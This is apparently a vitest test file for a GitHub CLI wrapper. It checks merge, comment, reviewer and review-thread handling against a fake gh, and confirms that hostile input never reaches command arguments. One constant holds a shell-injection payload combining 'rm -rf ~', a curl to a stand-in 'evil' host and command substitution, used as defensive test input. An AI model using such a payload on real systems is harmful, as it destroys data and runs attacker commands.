// The direct GitHub actions against a fake `gh`: nothing here reaches GitHub.
// Inkwell fixtures only.
import { describe, expect, it } from "vitest";
import {
  commentArgv,
  mergeArgv,
  parseReviewRequests,
  prTarget,
  readLiveMerge,
  readReviewThreads,
  rerequestArgv,
  runMerge,
  runNudge,
  runUpdateBranch,
  threadsArgv,
  type GhRunner,
  type Run,
} from "./ghactions.js";
import { parsePrList } from "./gh.js";

const SHA = "0123456789abcdef0123456789abcdef01234567";
const TARGET = prTarget("https://github.com/inkwell/folio/pull/47")!;
/** A hostile title, body and branch: none of it may ever reach an argv flag or a shell. */
const HOSTILE = `"; rm -rf ~ #$(curl evil) \`id\``;

function fakeGh(answers: (args: readonly string[]) => Run = () => ({ ok: true, stdout: "" })) {
  const calls: { args: readonly string[]; stdin: string | undefined }[] = [];
  const run: GhRunner = async (args, stdin) => {
    calls.push({ args, stdin });
    return answers(args);
  };
  return { run, calls };
}

describe("prTarget", () => {
  it("reads owner, repo and number from a PR URL, and names github.com repos as OWNER/REPO", () => {
    expect(TARGET).toEqual({ host: "github.com", owner: "inkwell", name: "folio", slug: "inkwell/folio", number: 47 });
    expect(prTarget("https://git.inkwell.example/inkwell/spine/pull/88")?.slug).toBe("git.inkwell.example/inkwell/spine");
  });

  it("refuses anything that is not a plain PR URL, so a crafted URL cannot become a gh argument", () => {
    for (const url of ["", "https://github.com/inkwell/folio/issues/47", "https://github.com/-x/folio/pull/47", "https://github.com/inkwell/../pull/47", `https://github.com/inkwell/folio/pull/47${HOSTILE}`]) {
      expect(prTarget(url)).toBeNull();
    }
  });
});

describe("argv construction", () => {
  it("always pins the merge to the confirmed head commit, and names the repo so gh leaves the local checkout alone", () => {
    expect(mergeArgv(TARGET, "squash", SHA, false)).toEqual(["pr", "merge", "47", "--repo", "inkwell/folio", "--squash", "--match-head-commit", SHA]);
    expect(mergeArgv(TARGET, "rebase", SHA, true)).toEqual(["pr", "merge", "47", "--repo", "inkwell/folio", "--rebase", "--match-head-commit", SHA, "--delete-branch"]);
  });

  it("refuses to build a merge without a full head sha, so --match-head-commit can never be skipped", () => {
    expect(() => mergeArgv(TARGET, "squash", "", false)).toThrow();
    expect(() => mergeArgv(TARGET, "squash", "abc123", false)).toThrow();
    expect(() => mergeArgv(TARGET, "squash", `${SHA} --admin`, false)).toThrow();
  });

  it("keeps the comment body out of argv entirely", () => {
    expect(commentArgv(TARGET)).toEqual(["pr", "comment", "47", "--repo", "inkwell/folio", "--body-file", "-"]);
  });

  it("drops anything that is not a login or team slug from --add-reviewer", () => {
    expect(rerequestArgv(TARGET, ["ada-inkwell", "--admin", HOSTILE, "inkwell/shelf-team"])).toEqual([
      "pr", "edit", "47", "--repo", "inkwell/folio", "--add-reviewer", "ada-inkwell,inkwell/shelf-team",
    ]);
    expect(() => rerequestArgv(TARGET, ["--admin"])).toThrow();
  });

  it("passes graphql variables as typed fields, with the query a constant", () => {
    const args = threadsArgv(TARGET);
    expect(args).toContain("owner=inkwell");
    expect(args).toContain("name=folio");
    expect(args).toContain("number=47");
    expect(args.some((arg) => arg.startsWith("query=") && arg.includes("$owner"))).toBe(true);
  });
});

describe("parseReviewRequests", () => {
  it("reads users by login and teams by org/slug, and drops anything else", () => {
    expect(
      parseReviewRequests([
        { __typename: "User", login: "ada-inkwell" },
        { __typename: "Team", slug: "shelf-team", organization: { login: "inkwell" } },
        { __typename: "Team", slug: "inkwell/margin-team" },
        { __typename: "User", login: "-flag" },
        null,
        "nonsense",
      ]),
    ).toEqual(["ada-inkwell", "inkwell/shelf-team", "inkwell/margin-team"]);
    expect(parseReviewRequests(undefined)).toEqual([]);
  });

  it("rides along on the existing gh pr list call, defaulting to none", () => {
    const row = (extra: object) => JSON.stringify([{ number: 61, state: "OPEN", ...extra }]);
    expect(parsePrList(row({ reviewRequests: [{ __typename: "User", login: "ada-inkwell" }] }))?.pr.reviewRequests).toEqual(["ada-inkwell"]);
    expect(parsePrList(row({}))?.pr.reviewRequests).toEqual([]);
  });
});

describe("readLiveMerge", () => {
  const view = { state: "OPEN", isDraft: false, reviewDecision: "APPROVED", mergeStateStatus: "CLEAN", headRefOid: SHA, headRefName: "dev/abc-101" };
  const threads = (nodes: { isResolved: boolean }[], hasNextPage = false) =>
    JSON.stringify({ data: { repository: { pullRequest: { reviews: { pageInfo: { hasPreviousPage: false }, nodes: [] }, reviewThreads: { pageInfo: { hasNextPage }, nodes } } } } });
  const answers = (stacked: object[], nodes: { isResolved: boolean }[], more = false) => (args: readonly string[]): Run => {
    if (args[1] === "view") return { ok: true, stdout: JSON.stringify(view) };
    if (args[1] === "list") return { ok: true, stdout: JSON.stringify(stacked) };
    return { ok: true, stdout: threads(nodes, more) };
  };

  it("reads state, head, open PRs stacked on the head branch, and unresolved threads — all read-only", async () => {
    const { run, calls } = fakeGh(answers([{ number: 58 }], [{ isResolved: false }, { isResolved: true }, { isResolved: false }]));
    const result = await readLiveMerge(run, TARGET);
    expect(result).toEqual({
      ok: true,
      live: {
        state: "OPEN",
        isDraft: false,
        reviewDecision: "APPROVED",
        mergeStateStatus: "CLEAN",
        headRefOid: SHA,
        stackedAbove: [58],
        unresolvedThreads: 2,
        unresolvedAtLeast: false,
        approvalNotes: [],
        approvalNotesMore: 0,
        approvalNotesComplete: true,
      },
    });
    expect(calls.find((call) => call.args[1] === "list")?.args).toEqual([
      "pr", "list", "--repo", "inkwell/folio", "--base", "dev/abc-101", "--state", "open", "--json", "number", "--limit", "50",
    ]);
    for (const call of calls) expect(["view", "list", "graphql"]).toContain(call.args[1]);
  });

  it("marks the unresolved count as a lower bound past one page", async () => {
    const { run } = fakeGh(answers([], [{ isResolved: false }], true));
    const result = await readLiveMerge(run, TARGET);
    expect(result.ok && result.live.unresolvedAtLeast).toBe(true);
  });

  it("fails loudly rather than reporting zero when the thread count cannot be read", async () => {
    const { run } = fakeGh((args) => (args[0] === "api" ? { ok: false, error: "HTTP 502" } : answers([], [])(args)));
    expect(await readLiveMerge(run, TARGET)).toEqual({ ok: false, error: "Could not count unresolved review threads: HTTP 502" });
  });

  it("shows a mixed approval note even after its inline thread is resolved and code moves on", async () => {
    const body = "The inline change is good. Also update the member-facing copy before merge.";
    const run = fakeGh((args) => {
      if (args[1] === "view") return { ok: true, stdout: JSON.stringify(view) };
      if (args[1] === "list") return { ok: true, stdout: "[]" };
      return { ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: {
        headRefOid: SHA,
        reviews: { pageInfo: { hasPreviousPage: false }, nodes: [{
          id: "approval-1", state: "APPROVED", body, submittedAt: "2026-09-22T18:11:52Z",
          author: { login: "reviewer" }, commit: { oid: "a".repeat(40) },
        }] },
        reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [{ isResolved: true, comments: { nodes: [{ pullRequestReview: { id: "approval-1" } }] } }] },
      } } } }) };
    });
    const result = await readLiveMerge(run.run, TARGET);
    expect(result).toMatchObject({ ok: true, live: {
      unresolvedThreads: 0,
      approvalNotes: [{ author: "reviewer", body, truncated: false }],
      approvalNotesMore: 0,
    } });
  });

  it("warns when approval history is incomplete, while keeping merge preflight available", async () => {
    const run = fakeGh((args) => args[0] === "api"
      ? { ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: {
        reviews: { pageInfo: { hasPreviousPage: true }, nodes: [{
          state: "APPROVED", body: "Newest request is still visible.", author: { login: "reviewer" },
          submittedAt: "2026-09-24T12:00:00Z",
        }] },
        reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] },
      } } } }) }
      : answers([], [])(args));
    expect(await readLiveMerge(run.run, TARGET)).toMatchObject({ ok: true, live: {
      approvalNotes: [{ body: "Newest request is still visible." }], approvalNotesComplete: false,
    } });
  });

  it("bounds long approval bodies and reports omitted older notes", async () => {
    const run = fakeGh((args) => args[0] === "api"
      ? { ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: {
        reviews: { pageInfo: { hasPreviousPage: false }, nodes: Array.from({ length: 4 }, (_, index) => ({
          state: "APPROVED", body: "x".repeat(2_000), author: { login: `reviewer-${index}` },
          submittedAt: `2026-09-2${index}T12:00:00Z`,
        })) },
        reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] },
      } } } }) }
      : answers([], [])(args));
    const result = await readLiveMerge(run.run, TARGET);
    expect(result.ok && result.live.approvalNotes).toHaveLength(3);
    expect(result.ok && result.live.approvalNotes[0]?.body).toHaveLength(1_200);
    expect(result.ok && result.live.approvalNotes[0]?.truncated).toBe(true);
    expect(result.ok && result.live.approvalNotesMore).toBe(1);
  });
});

describe("readReviewThreads", () => {
  it("recognizes #1098-style author PTAL only after newer code and all review threads are resolved", async () => {
    const review = { id: "requested-1098", state: "CHANGES_REQUESTED", body: "", author: { login: "shehabPH" }, submittedAt: "2026-09-18T17:49:34Z", commit: { oid: "a".repeat(40) } };
    const resolved = { isResolved: true, comments: { nodes: [{ pullRequestReview: { id: review.id } }] } };
    const pr = {
      headRefOid: "b".repeat(40), author: { login: "mjsz" },
      reviews: { pageInfo: { hasPreviousPage: false }, nodes: [review] },
      reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [resolved] },
      comments: { nodes: [{ author: { login: "mjsz" }, createdAt: "2026-09-25T02:00:23Z", body: "PTAL @shehabPH — the fixes are pushed." }] },
      commits: { nodes: [{ commit: { oid: "b".repeat(40), committedDate: "2026-09-23T00:11:46Z" } }] },
    };
    const read = (value: unknown) => readReviewThreads(fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: value } } }) })).run, TARGET, true);
    expect(await read(pr)).toMatchObject({ ok: true, count: 0, reviewFollowupPosted: true });
    expect(await read({ ...pr, reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [{ ...resolved, isResolved: false }] } })).toMatchObject({ ok: true, count: 1 });
    expect(await read({ ...pr, comments: { nodes: [{ author: { login: "mjsz" }, createdAt: "2026-09-25T02:00:23Z", body: "Fixes pushed." }] } })).toMatchObject({ ok: true, reviewFollowupPosted: false });
    expect(await read({ ...pr, commits: { nodes: [{ commit: { oid: pr.headRefOid, committedDate: "2026-09-26T00:00:00Z" } }] } })).toMatchObject({ ok: true, reviewFollowupPosted: false });
    expect(await read({ ...pr, commits: { nodes: [{ commit: { oid: pr.headRefOid, committedDate: "2026-09-18T16:00:00Z" } }] } })).toMatchObject({ ok: true, reviewFollowupPosted: false });
    expect(await read({ ...pr, comments: { nodes: [{ author: { login: "other" }, createdAt: "2026-09-25T02:00:23Z", body: "PTAL @shehabPH" }] } })).toMatchObject({ ok: true, reviewFollowupPosted: false });
  });
  it("treats #2846-style approval text as followed up when its own threads resolve on a later head", async () => {
    const approval = { id: "approval-2846", state: "APPROVED", body: "Two member-facing points to fix before merge.", author: { login: "reviewer" }, submittedAt: "2026-09-22T18:11:52Z", commit: { oid: "a".repeat(40) } };
    const pullRequest = {
      headRefOid: "b".repeat(40),
      reviews: { pageInfo: { hasPreviousPage: false }, nodes: [approval] },
      reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [
        { isResolved: true, comments: { nodes: [{ pullRequestReview: { id: approval.id } }] } },
        { isResolved: true, comments: { nodes: [{ pullRequestReview: { id: approval.id } }] } },
      ] },
    };
    const read = (pr: unknown) => readReviewThreads(fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: pr } } }) })).run, TARGET);
    expect(await read(pullRequest)).toMatchObject({ ok: true, count: 0, resolvedCount: 2, approvalNoteFollowedUp: true });
    expect(await read({ ...pullRequest, headRefOid: approval.commit.oid })).toMatchObject({ ok: true, approvalNoteFollowedUp: false });
    expect(await read({ ...pullRequest, reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] } })).toMatchObject({ ok: true, approvalNoteFollowedUp: false });
    const laterEmpty = { id: "approval-later", state: "APPROVED", body: "", author: { login: "reviewer" }, submittedAt: "2026-09-24T13:00:00Z", commit: { oid: "b".repeat(40) } };
    expect(await read({ ...pullRequest, reviews: { pageInfo: { hasPreviousPage: false }, nodes: [approval, laterEmpty] } })).not.toHaveProperty("approvalNoteFollowedUp");
  });

  it("keeps #988-style standalone approval text actionable when there are no inline threads", async () => {
    const head = "c".repeat(40);
    const pr = { headRefOid: head, reviews: { pageInfo: { hasPreviousPage: false }, nodes: [{ id: "approval-988", state: "APPROVED", body: "Dependent name/DOB mismatch needs review.", author: { login: "reviewer" }, submittedAt: "2026-09-24T23:31:34Z", commit: { oid: head } }] }, reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] } };
    const run = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: pr } } }) }));
    expect(await readReviewThreads(run.run, TARGET)).toMatchObject({ ok: true, count: 0, approvalNoteFollowedUp: false });
  });

  it("clears a standalone approval note only after a targeted author reply tied to the pushed head", async () => {
    const head = "b".repeat(40);
    const review = { id: "approval-988", state: "APPROVED", body: "Please fix the dependent name/DOB mismatch.", author: { login: "adriana" }, submittedAt: "2026-09-24T23:31:34Z", commit: { oid: "a".repeat(40) } };
    const pr = {
      headRefOid: head, author: { login: "author" },
      reviews: { pageInfo: { hasPreviousPage: false }, nodes: [review] },
      reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] },
      commits: { nodes: [{ commit: { oid: head, committedDate: "2026-09-25T01:00:00Z" } }] },
      comments: { nodes: [{ author: { login: "author" }, createdAt: "2026-09-25T02:00:00Z", body: `Approval note for @adriana: fixed the dependent mismatch at ${head.slice(0, 7)}.` }] },
    };
    const read = (value: unknown) => readReviewThreads(fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: value } } }) })).run, TARGET, true);
    expect(await read(pr)).toMatchObject({ ok: true, count: 0, approvalNoteFollowedUp: true });
    expect(await read({ ...pr, headRefOid: review.commit.oid,
      commits: { nodes: [{ commit: { oid: review.commit.oid, committedDate: "2026-09-24T20:00:00Z" } }] },
      comments: { nodes: [{ ...pr.comments.nodes[0], body: `Approval note for @adriana: informational; no code change needed at ${review.commit.oid.slice(0, 7)}.` }] },
    })).toMatchObject({ ok: true, approvalNoteFollowedUp: true });
    expect(await read({ ...pr, comments: { nodes: [{ ...pr.comments.nodes[0], body: "PTAL @adriana; fixes pushed." }] } })).toMatchObject({ ok: true, approvalNoteFollowedUp: false });
    expect(await read({ ...pr, comments: { nodes: [{ ...pr.comments.nodes[0], body: `Approval note for @adriana: fixed at ${"c".repeat(7)}.` }] } })).toMatchObject({ ok: true, approvalNoteFollowedUp: false });
    expect(await read({ ...pr, comments: { nodes: [{ ...pr.comments.nodes[0], createdAt: "2026-09-24T23:00:00Z" }] } })).toMatchObject({ ok: true, approvalNoteFollowedUp: false });
  });
  it("counts resolved history only for a complete page, separately from open threads", async () => {
    const resolved = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: false }, nodes: Array.from({ length: 8 }, () => ({ isResolved: true })) } } } } }) }));
    expect(await readReviewThreads(resolved.run, TARGET)).toEqual({ ok: true, count: 0, resolvedCount: 8, hasNextPage: false });
    const incomplete = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: true }, nodes: [{ isResolved: true }, { isResolved: false }] } } } } }) }));
    expect(await readReviewThreads(incomplete.run, TARGET)).toEqual({ ok: true, count: 1, resolvedCount: null, hasNextPage: true });
  });

  it("refuses an empty first page when later review thread pages are unread, so neither the Board nor merge dialog claims the PR is clear", async () => {
    const paginated = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: true }, nodes: [{ isResolved: true }] } } } } }) }));
    expect((await readReviewThreads(paginated.run, TARGET)).ok).toBe(false);
    expect((await readLiveMerge(paginated.run, TARGET)).ok).toBe(false);
  });

  it("does not turn partial GraphQL data or unreadable nodes into a clear review state", async () => {
    const partial = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ errors: [{ message: "partial" }], data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [] } } } } }) }));
    expect((await readReviewThreads(partial.run, TARGET)).ok).toBe(false);
    const malformed = fakeGh(() => ({ ok: true, stdout: JSON.stringify({ data: { repository: { pullRequest: { reviewThreads: { pageInfo: { hasNextPage: false }, nodes: [{}] } } } } }) }));
    expect((await readReviewThreads(malformed.run, TARGET)).ok).toBe(false);
  });
});

describe("writes", () => {
  it("merges once, with the confirmed sha, and reports GitHub's refusal when the head moved", async () => {
    const ok = fakeGh();
    expect((await runMerge(ok.run, TARGET, "squash", SHA, false)).ok).toBe(true);
    expect(ok.calls).toHaveLength(1);
    expect(ok.calls[0]!.args).toContain("--match-head-commit");
    const moved = fakeGh(() => ({ ok: false, error: "Head branch was modified" }));
    expect(await runMerge(moved.run, TARGET, "squash", SHA, false)).toEqual({
      ok: false,
      error: "GitHub refused the merge: Head branch was modified",
    });
  });

  it("updates the branch with one gh pr update-branch call", async () => {
    const { run, calls } = fakeGh();
    expect((await runUpdateBranch(run, TARGET)).ok).toBe(true);
    expect(calls.map((call) => call.args)).toEqual([["pr", "update-branch", "47", "--repo", "inkwell/folio"]]);
  });

  it("nudges with pending reviewers: re-requests, then posts the body on stdin only", async () => {
    const { run, calls } = fakeGh();
    const body = `PTAL - @ada-inkwell: folio #47 (${HOSTILE}) has been waiting 3d.`;
    expect((await runNudge(run, TARGET, ["ada-inkwell"], body)).ok).toBe(true);
    expect(calls[0]!.args).toEqual(["pr", "edit", "47", "--repo", "inkwell/folio", "--add-reviewer", "ada-inkwell"]);
    expect(calls[1]).toEqual({ args: ["pr", "comment", "47", "--repo", "inkwell/folio", "--body-file", "-"], stdin: body });
    for (const call of calls) expect(call.args.join(" ")).not.toContain(HOSTILE);
  });

  it("nudges with no pending reviewers: comment only, no re-request call", async () => {
    const { run, calls } = fakeGh();
    expect((await runNudge(run, TARGET, [], "PTAL - folio #47 (Show gift card balance) has been waiting 3d.")).ok).toBe(true);
    expect(calls.map((call) => call.args[1])).toEqual(["comment"]);
  });

  it("does nothing, and says so, when neither part was chosen", async () => {
    const { run, calls } = fakeGh();
    expect((await runNudge(run, TARGET, [], null)).ok).toBe(false);
    expect(calls).toEqual([]);
  });
});
